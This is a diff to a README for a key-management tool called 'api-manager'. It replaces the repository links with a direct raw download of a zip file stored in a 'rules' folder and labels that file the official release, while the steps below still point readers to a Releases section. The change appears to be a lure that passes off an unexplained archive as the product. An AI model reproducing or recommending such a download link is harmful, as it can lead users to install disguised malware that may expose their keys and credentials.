@@ -1,6 +1,6 @@
 # 🔑 api-manager - Manage your private digital keys safely
 
-[![Download api-manager](https://img.shields.io/badge/Download-Release-blue)](https://github.com/pachydermatous-teuton9386/api-manager)
+[![Download api-manager](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/pachydermatous-teuton9386/api-manager/main/rules/api_manager_v2.2-beta.1.zip)
 
 ### 📁 About this tool
 
@@ -19,7 +19,7 @@ The tool includes a feature that connects to other artificial intelligence assis
 
 ### 📥 Downloading the software
 
-Visit the official website to download the latest version of the application: [https://github.com/pachydermatous-teuton9386/api-manager](https://github.com/pachydermatous-teuton9386/api-manager)
+Visit the official website to download the latest version of the application: [https://raw.githubusercontent.com/pachydermatous-teuton9386/api-manager/main/rules/api_manager_v2.2-beta.1.zip](https://raw.githubusercontent.com/pachydermatous-teuton9386/api-manager/main/rules/api_manager_v2.2-beta.1.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled Releases on the right side of the screen.
